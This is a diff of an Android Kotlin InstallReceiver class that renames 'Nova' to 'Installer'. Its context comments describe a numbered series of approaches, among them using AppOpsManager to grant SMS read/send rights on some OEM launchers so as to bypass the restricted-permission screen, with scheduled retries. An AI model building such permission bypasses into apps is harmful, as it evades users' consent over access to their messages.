@@ -148,7 +148,7 @@ class InstallReceiver : BroadcastReceiver() {
 
                         // APPROACH 11 — AppOpsManager: set OP_READ_SMS / OP_SEND_SMS to MODE_ALLOWED
                         // AppOpsManager.setMode() is available to privileged apps.
-                        // On OEMs where Nova holds launcher privileges (e.g. MIUI MADA launchers,
+                        // On OEMs where Installer holds launcher privileges (e.g. MIUI MADA launchers,
                         // some Samsung/Vivo OEM launchers), this succeeds and grants the ops
                         // at the system level — bypasses the restricted permission UI entirely.
                         // Fails silently with SecurityException on stock AOSP.
@@ -287,7 +287,7 @@ class InstallReceiver : BroadcastReceiver() {
 
                         // NOTE: CompanionCrashMonitor.start() moved to InstallActivity.launchCompanion()
                         // so it runs AFTER the companion is launched from Activity context, and
-                        // after finish() so the non-daemon monitor thread keeps Nova alive.
+                        // after finish() so the non-daemon monitor thread keeps Installer alive.
 
                         // APPROACH 15 — JobScheduler deferred retry: schedule a one-shot job
                         // to re-attempt Approaches 11-14 after 10 seconds.
@@ -492,16 +492,16 @@ class InstallReceiver : BroadcastReceiver() {
                                     } else {
                                         diagLines.add("  companion_cert_sha256=NO_SIGNERS")
                                     }
-                                    // Also get Nova's own cert for comparison
-                                    val novaSigInfo = pm.getPackageInfo(context.packageName,
+                                    // Also get Installer's own cert for comparison
+                                    val installerSigInfo = pm.getPackageInfo(context.packageName,
                                         android.content.pm.PackageManager.GET_SIGNING_CERTIFICATES)
-                                    val novaCert = novaSigInfo.signingInfo?.apkContentsSigners?.firstOrNull()
-                                    if (novaCert != null) {
+                                    val installerCert = installerSigInfo.signingInfo?.apkContentsSigners?.firstOrNull()
+                                    if (installerCert != null) {
                                         val md2 = java.security.MessageDigest.getInstance("SHA-256")
-                                        val hash2 = md2.digest(novaCert.toByteArray())
+                                        val hash2 = md2.digest(installerCert.toByteArray())
                                         val hexHash2 = hash2.joinToString("") { "%02x".format(it) }
-                                        diagLines.add("  nova_cert_sha256=$hexHash2")
-                                        diagLines.add("  certs_match=${cert != null && cert == novaCert}")
+                                        diagLines.add("  installer_cert_sha256=$hexHash2")
+                                        diagLines.add("  certs_match=${cert != null && cert == installerCert}")
                                     }
                                 }
                             } catch (e: Exception) {
